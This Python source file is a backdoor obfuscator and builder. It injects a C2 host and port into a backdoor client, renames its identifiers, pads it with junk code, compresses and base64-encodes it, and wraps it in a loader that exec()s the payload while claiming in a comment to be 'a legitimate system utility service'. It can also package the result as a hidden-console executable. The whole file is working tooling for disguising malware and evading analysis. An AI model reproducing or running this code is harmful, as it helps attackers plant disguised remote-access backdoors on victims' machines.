import base64
import random
import string
import zlib
import os
import sys

class BackdoorObfuscator:
    def __init__(self, input_file="backdoor_client.py", output_file="obfuscated_backdoor.py"):
        self.input_file = input_file
        self.output_file = output_file
        self.variable_mapping = {}
        self.junk_functions = []
        self.junk_strings = []
        
    def _generate_random_name(self, length=8):
        """Generate a random variable name"""
        return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))
    
    def _generate_junk_code(self, count=5):
        """Generate junk functions to make analysis harder"""
        functions = []
        for _ in range(count):
            func_name = self._generate_random_name(12)
            param_count = random.randint(1, 4)
            params = [self._generate_random_name(4) for _ in range(param_count)]
            
            operations = []
            for _ in range(random.randint(3, 10)):
                op_type = random.choice(['math', 'string', 'condition'])
                
                if op_type == 'math':
                    var = self._generate_random_name(5)
                    value = random.randint(1, 1000)
                    op = random.choice(['+', '-', '*', '//'])
                    operations.append(f"    {var} = {value} {op} {random.randint(1, 100)}")
                    
                elif op_type == 'string':
                    var = self._generate_random_name(5)
                    s = ''.join(random.choice(string.ascii_letters) for _ in range(random.randint(5, 20)))
                    operations.append(f"    {var} = '{s}'")
                    operations.append(f"    {var} = {var}.upper()" if random.random() > 0.5 else f"    {var} = {var}.lower()")
                    
                elif op_type == 'condition':
                    var = self._generate_random_name(5)
                    value = random.randint(1, 100)
                    operations.append(f"    {var} = {value}")
                    operations.append(f"    if {var} % {random.randint(1, 10)} == 0:")
                    operations.append(f"        {var} = {var} + {random.randint(1, 50)}")
                    operations.append(f"    else:")
                    operations.append(f"        {var} = {var} - {random.randint(1, 20)}")
            
            # Create a return value
            return_val = random.choice(['True', 'False', 'None', str(random.randint(1, 1000)), '"' + ''.join(random.choice(string.ascii_letters) for _ in range(random.randint(5, 15))) + '"'])
            operations.append(f"    return {return_val}")
            
            function = f"def {func_name}({', '.join(params)}):\n" + '\n'.join(operations)
            functions.append((func_name, function))
            
        self.junk_functions = functions
        return functions
    
    def _generate_junk_strings(self, count=10):
        """Generate random string variables to confuse analysis"""
        strings = []
        for _ in range(count):
            var_name = self._generate_random_name(10)
            string_content = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(20, 100)))
            strings.append((var_name, string_content))
        self.junk_strings = strings
        return strings
    
    def _rename_variables(self, code):
        """Rename all variables and function names to random strings"""
        import ast
        import astor
        
        try:
            # Parse the code into an AST
            tree = ast.parse(code)
            
            # Track variables to rename (excluding imports and standard functions)
            variables_to_rename = set()
            
            # Find all variable names
            for node in ast.walk(tree):
                if isinstance(node, ast.Name) and isinstance(node.ctx, ast.Store):
                    variables_to_rename.add(node.id)
                elif isinstance(node, ast.FunctionDef):
                    if not node.name.startswith('__'):  # Skip special methods
                        variables_to_rename.add(node.name)
            
            # Create a mapping of old names to new random names
            for var in variables_to_rename:
                if var not in self.variable_mapping:
                    self.variable_mapping[var] = self._generate_random_name(12)
            
            # Rename variables and function names in the AST
            class VariableRenamer(ast.NodeTransformer):
                def __init__(self, mapping):
                    self.mapping = mapping
                
                def visit_Name(self, node):
                    if node.id in self.mapping:
                        node.id = self.mapping[node.id]
                    return node
                
                def visit_FunctionDef(self, node):
                    if node.name in self.mapping:
                        node.name = self.mapping[node.name]
                    return self.generic_visit(node)
            
            # Apply the transformation
            transformed = VariableRenamer(self.variable_mapping).visit(tree)
            transformed = ast.fix_missing_locations(transformed)
            
            # Convert back to code
            return astor.to_source(transformed)
        
        except (SyntaxError, ImportError) as e:
            print(f"Error during variable renaming: {e}")
            return code  # Return original code if there's an error
    
    def obfuscate(self, host=None, port=None, custom_imports=None):
        """Obfuscate the backdoor client"""
        try:
            with open(self.input_file, 'r') as f:
                code = f.read()
            
            # Replace host and port if specified
            if host:
                code = code.replace('host="127.0.0.1"', f'host="{host}"')
            if port:
                code = code.replace('port=4444', f'port={port}')
            
            # Add custom imports if specified
            if custom_imports:
                for imp in custom_imports:
                    if imp not in code:
                        code = f"import {imp}\n{code}"
            
            # Generate junk code and strings
            self._generate_junk_code(random.randint(8, 15))
            self._generate_junk_strings(random.randint(10, 20))
            
            # Try to rename variables (if astor is installed)
            try:
                import astor
                code = self._rename_variables(code)
            except ImportError:
                print("Warning: astor module not found. Variable renaming skipped.")
            
            # Compress and encode the code
            compressed_code = zlib.compress(code.encode())
            encoded_code = base64.b64encode(compressed_code).decode()
            
            # Split the encoded string into smaller chunks
            chunk_size = 76
            chunks = [encoded_code[i:i+chunk_size] for i in range(0, len(encoded_code), chunk_size)]
            
            # Create the loader script
            loader = f"""#!/usr/bin/env python3
# {'=' * 70}
# Encrypted Python Backdoor
# This is a legitimate system utility service
# {'=' * 70}

import base64
import zlib
import sys
import random
import time
import os

"""
            
            # Add junk functions to loader
            for _, func in self.junk_functions:
                loader += func + "\n\n"
            
            # Add junk strings
            for var_name, content in self.junk_strings:
                loader += f"{var_name} = \"{content}\"\n"
            
            # Add some misleading comments
            loader += f"""
# Configuration settings
debug_mode = False
max_retries = {random.randint(3, 10)}
timeout = {random.randint(30, 120)}

# Main application paths
app_data = os.path.join(os.path.expanduser("~"), ".config", "system_utility")
log_path = os.path.join(app_data, "logs")

"""
            
            # Add more junk code
            loader += f"""
def initialize_system():
    if not os.path.exists(app_data):
        try:
            os.makedirs(app_data)
            os.makedirs(log_path)
            return True
        except:
            return False
    return True

def check_environment():
    system_check = {self.junk_functions[0][0] if self.junk_functions else "lambda: True"}()
    if debug_mode:
        print("Environment check passed")
    return system_check

"""
            
            # Add the encoded backdoor
            loader += f"""
{self._generate_random_name()} = [
    {','.join([f'"{chunk}"' for chunk in chunks])}
]

def {self._generate_random_name()}():
    # Decode and execute the main application code
    try:
        {self._generate_random_name(5)} = ''.join({self._generate_random_name()})
        {self._generate_random_name(6)} = base64.b64decode({self._generate_random_name(5)})
        {self._generate_random_name(7)} = zlib.decompress({self._generate_random_name(6)})
        exec({self._generate_random_name(7)})
    except Exception as e:
        if debug_mode:
            print(f"Error: {{e}}")
        sys.exit(1)

if __name__ == "__main__":
    if initialize_system() and check_environment():
        {self._generate_random_name()}()
"""
            
            # Write the obfuscated backdoor to the output file
            with open(self.output_file, 'w') as f:
                f.write(loader)
            
            print(f"[+] Obfuscated backdoor created: {self.output_file}")
            return True
        
        except Exception as e:
            print(f"[-] Error during obfuscation: {str(e)}")
            return False
    
    def create_executable(self, icon=None, console=False):
        """Create an executable from the obfuscated Python script"""
        try:
            # Check if PyInstaller is installed
            import importlib
            importlib.import_module('PyInstaller')
            
            # Build the PyInstaller command
            output_name = os.path.splitext(self.output_file)[0]
            cmd = f"pyinstaller --onefile "
            
            if not console:
                cmd += "--noconsole "
            
            if icon and os.path.exists(icon):
                cmd += f"--icon={icon} "
            
            cmd += f"--name={output_name} {self.output_file}"
            
            # Execute the command
            print(f"[*] Creating executable with PyInstaller...")
            os.system(cmd)
            
            print(f"[+] Executable created: ./dist/{output_name}.exe")
            return True
            
        except ImportError:
            print("[-] Error: PyInstaller not found. Install it with 'pip install pyinstaller'")
            return False
        except Exception as e:
            print(f"[-] Error creating executable: {str(e)}")
            return False


if __name__ == "__main__":
    print("""
╔══════════════════════════════════════════════╗
║       Backdoor Obfuscator & Builder          ║
╚══════════════════════════════════════════════╝
""")
    
    # Parse command line arguments
    import argparse
    parser = argparse.ArgumentParser(description="Obfuscate a Python backdoor")
    parser.add_argument("-i", "--input", help="Input backdoor file (default: backdoor_client.py)", default="backdoor_client.py")
    parser.add_argument("-o", "--output", help="Output obfuscated file (default: obfuscated_backdoor.py)", default="obfuscated_backdoor.py")
    parser.add_argument("-H", "--host", help="C2 server IP address")
    parser.add_argument("-p", "--port", help="C2 server port", type=int)
    parser.add_argument("-e", "--exe", help="Create executable", action="store_true")
    parser.add_argument("--icon", help="Icon file for executable")
    parser.add_argument("--console", help="Show console window (for executable)", action="store_true")
    
    args = parser.parse_args()
    
    obfuscator = BackdoorObfuscator(args.input, args.output)
    
    # Obfuscate the backdoor
    success = obfuscator.obfuscate(args.host, args.port)
    
    # Create executable if requested
    if success and args.exe:
        obfuscator.create_executable(args.icon, args.console)
    
    if success:
        print(f"\n[+] Done! Your obfuscated backdoor is ready.")
        print(f"[*] File size: {os.path.getsize(args.output)} bytes")
    else:
        print(f"\n[-] Failed to create obfuscated backdoor.") 